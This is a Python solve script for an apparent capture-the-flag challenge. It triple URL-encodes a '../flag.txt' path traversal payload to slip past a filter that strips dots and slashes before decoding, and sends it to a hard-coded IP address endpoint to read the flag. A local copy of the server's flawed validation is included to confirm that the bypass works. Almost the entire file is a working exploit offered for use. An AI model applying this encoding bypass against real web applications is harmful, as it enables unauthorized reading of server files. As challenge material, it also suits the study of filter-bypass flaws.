import os
import urllib.parse
import requests

base_directory = "message/"
file_param = '../flag.txt'

def url_encode_path(file_param):
    res = ''
    for s in file_param:
        res += '%'+hex(ord(s))[2:].upper()
    return res

# Reverse useless
file_param = url_encode_path(file_param)
file_param = url_encode_path(file_param)
file_param = url_encode_path(file_param)
print(f'file_param: "{file_param}"')


# Send request to server to get flag
url = 'http://34.132.132.69:8003/read_secret_message'
print(requests.get(url, params = {
    'file': file_param
}).text)


# Test if worked
def ignore_it(file_param):
    yoooo = file_param.replace('.', '').replace('/', '')
    if yoooo != file_param:
        return "Illegal characters detected in file parameter!"
    return yoooo

def another_useless_function(file_param):
    return urllib.parse.unquote(file_param)

def useless (file_param):
    file_param1 = ignore_it(file_param)
    file_param2 = another_useless_function(file_param1)
    file_param3 = ignore_it(file_param2)
    file_param4 = another_useless_function(file_param3)
    file_param5 = another_useless_function(file_param4)
    return file_param5

file_param = useless(file_param)
file_path = os.path.join(base_directory, file_param)

try:
    with open(file_path, 'r') as file:
        content = file.read()
    if content == 'flag{FAKE_FLAG}':
        print("file_param is correct")
except FileNotFoundError:
    print('File not found! or maybe illegal characters detected')
except Exception as e:
    print(f'Error: {e}')
    
    